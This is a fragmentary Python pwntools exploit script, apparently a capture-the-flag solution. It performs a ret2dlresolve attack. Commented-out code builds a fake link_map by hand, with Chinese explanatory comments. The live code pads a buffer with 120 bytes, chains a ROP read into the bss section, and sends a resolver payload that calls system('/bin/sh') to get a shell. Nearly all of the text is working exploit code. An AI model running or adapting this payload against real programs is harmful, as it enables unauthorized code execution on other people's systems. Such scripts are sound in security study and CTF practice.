...
#     r_offset = (fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1)
#     # Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可
#     linkmap += p64(r_offset)
#     # linkmap += p64(bss_stage + 0x300)
#     print(f'r_offset: {hex(r_offset)}')
#     print(hex(0x30 - offset))
...
# payload = flat(b'a' * 120, pop_rdi, 0, pop_rsi, bss_stage, 0, read_plt,
#                # 把link_map写到bss段上
...
dl_resolve_payload = Ret2dlresolvePayload(elf, "system", ["/bin/sh"],
                                          bss_stage)

rop = ROP([elf])

rop.raw(b'a' * 120)
rop.read(0, bss_stage, 1000)
...
r.sendline(dl_resolve_payload.payload)
